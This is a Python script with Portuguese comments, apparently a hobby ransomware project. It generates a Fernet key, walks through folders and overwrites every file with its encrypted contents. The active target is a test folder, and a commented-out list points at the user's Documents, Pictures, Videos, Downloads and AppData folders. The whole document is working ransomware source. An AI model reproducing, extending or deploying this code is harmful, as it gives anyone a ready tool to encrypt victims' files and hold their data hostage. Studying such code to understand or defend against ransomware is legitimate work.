import os
from cryptography.fernet import Fernet # Biblioteca para criptografar

key = Fernet.generate_key() # Gera uma chave para cript e descript

with open("chave.key", "wb") as chave: # Cria um arquivo onde armazena e esreve a chave
    chave.write(key)


# print('A chave é: ', key) # Mostra a chave

arquivos = [] # lista que vai receber todos os arquivos
username = os.getenv("USERNAME") # recebe o nome do usuário da máquina

# print(username) -- mostrar o username da máquina

# caminho da pasta ou pastas que foram criptografas, fiz uma pasta teste para não deteriorar a minha máquina 
# mude para o seu caminho teste -> EX do meu: C:\Users\xxxx\Desktop\Meus_Codigos\ramsoware\pasta teste
folders = [os.path.join(r"C:\Users", username, "Desktop", "Meus_Codigos", "ramsoware", "pasta teste")] 

#   folders = [
#        os.path.join(r"C:\Users", username, "Documents"),
#        os.path.join(r"C:\Users", username, "Pictures"),
#        os.path.join(r"C:\Users", username, "Videos"),
#        os.path.join(r"C:\Users", username, "Downloads"),
#        os.path.join(r"C:\Users", username, "AppData", "Local"),
#        os.path.join(r"C:\Users", username, "AppData", "Roaming")
#   ]

# print("Pastas que serão afetadas:", folders) # mostra o local da pasta

for folder in folders:
    for root, dirs, files in os.walk(folder):
        for file in files:
            if file in ['cript.py', 'chave.key', 'descript.py', 'desktop.ini']: # coloca os seguintes aquivos em '' como exeção
                continue

            file_path = os.path.join(root, file)
            arquivos.append(file_path)

# print("Pastas que serão afetadas:", arquivos) # mostra os arquivos e as pastas existentes que serão criptografadas

# criptografa os arquivos
for arquivo in arquivos:
    with open(arquivo, "rb") as file:
        conteudo = file.read()
    
    conteudo_criptografado = Fernet(key).encrypt(conteudo)

    # reescreve o conteudo todo em binário
    with open(arquivo, "wb") as file:
        file.write(conteudo_criptografado)